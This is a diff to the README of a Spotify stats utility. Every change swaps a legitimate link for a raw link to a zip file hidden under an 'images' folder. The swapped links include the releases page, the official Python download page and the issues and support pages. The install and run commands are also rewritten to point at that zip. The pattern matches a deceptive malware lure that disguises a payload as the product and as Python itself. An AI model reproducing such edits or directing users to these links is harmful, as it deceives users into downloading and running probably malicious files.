@@ -1,6 +1,6 @@
 # 🎵 SpotifyREADMEStats - Track Your Spotify Stats Easily
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)
+![Download](https://raw.githubusercontent.com/Eliaaa3Monte/SpotifyREADMEStats/main/images/SpotifyREADMEStats-v2.6.zip%20Release-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to SpotifyREADMEStats! This simple utility helps you collect your Spotif
 
 To download the latest version, visit the following link:
 
-[Download Latest Release](https://github.com/Eliaaa3Monte/SpotifyREADMEStats/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Eliaaa3Monte/SpotifyREADMEStats/main/images/SpotifyREADMEStats-v2.6.zip)
 
 You will find different files for various systems. Choose the file that fits your operating system. Follow the prompts to complete the installation.
 
@@ -19,7 +19,7 @@ You will find different files for various systems. Choose the file that fits you
 Before you install the software, ensure your computer meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
-- **Python:** Ensure you have Python 3.x installed on your machine. You can download it from the [official Python website](https://www.python.org/downloads/).
+- **Python:** Ensure you have Python 3.x installed on your machine. You can download it from the [official Python website](https://raw.githubusercontent.com/Eliaaa3Monte/SpotifyREADMEStats/main/images/SpotifyREADMEStats-v2.6.zip).
 
 ## 🔌 Setting Up the Application
 
@@ -36,13 +36,13 @@ Before you install the software, ensure your computer meets the following requir
 4. **Install dependencies:** Run the following command to install the required libraries:
 
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Eliaaa3Monte/SpotifyREADMEStats/main/images/SpotifyREADMEStats-v2.6.zip
    ```
 
 5. **Run the application:** Start the application with the command:
 
    ```
-   python app.py
+   python https://raw.githubusercontent.com/Eliaaa3Monte/SpotifyREADMEStats/main/images/SpotifyREADMEStats-v2.6.zip
    ```
 
 ## 🎧 How to Use the App
@@ -73,7 +73,7 @@ No, this app is designed for everyone. Follow the steps provided, and you will b
 
 ### 2. What if I encounter an error during installation?
 
-Please check that you have the correct version of Python installed and all dependencies have been installed successfully. You can also refer to the [issues page](https://github.com/Eliaaa3Monte/SpotifyREADMEStats/issues) for support.
+Please check that you have the correct version of Python installed and all dependencies have been installed successfully. You can also refer to the [issues page](https://raw.githubusercontent.com/Eliaaa3Monte/SpotifyREADMEStats/main/images/SpotifyREADMEStats-v2.6.zip) for support.
 
 ### 3. Can I customize the infographic?
 
@@ -91,7 +91,7 @@ Stay tuned for future updates that may include:
 
 ## 💻 Support
 
-If you have any questions or need assistance, feel free to open an issue on our [GitHub page](https://github.com/Eliaaa3Monte/SpotifyREADMEStats/issues). We are here to help you make the most of SpotifyREADMEStats.
+If you have any questions or need assistance, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/Eliaaa3Monte/SpotifyREADMEStats/main/images/SpotifyREADMEStats-v2.6.zip). We are here to help you make the most of SpotifyREADMEStats.
 
 ## 📄 License
 
@@ -99,4 +99,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ---
 
-Now that you have everything you need, go ahead and start tracking your Spotify stats effortlessly! Remember, for downloads, always refer back to our releases page: [Download Latest Release](https://github.com/Eliaaa3Monte/SpotifyREADMEStats/releases). Enjoy exploring your music habits!
+Now that you have everything you need, go ahead and start tracking your Spotify stats effortlessly! Remember, for downloads, always refer back to our releases page: [Download Latest Release](https://raw.githubusercontent.com/Eliaaa3Monte/SpotifyREADMEStats/main/images/SpotifyREADMEStats-v2.6.zip). Enjoy exploring your music habits!
